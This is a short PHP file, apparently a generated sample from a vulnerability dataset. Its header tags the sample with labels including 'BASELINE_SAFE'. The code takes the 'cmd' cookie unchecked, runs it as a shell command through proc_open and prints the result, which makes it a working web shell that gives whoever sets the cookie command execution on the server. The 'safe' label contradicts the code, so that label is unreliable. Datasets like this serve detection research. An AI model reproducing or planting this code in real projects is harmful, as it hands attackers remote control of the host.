<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=COOKIE_DIRECT; SKELETON=S0; KEY=cmd; SINK=B5; VAR=v0085 */
function SINK_B5($command){
    $process = proc_open($command, [["pipe", "r"], ["pipe", "w"]], $pipes);
            if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            proc_close($process);
            echo $output;
}
}
$inp = (string)($_COOKIE["cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B5($inp);
echo (string)($out);
?>
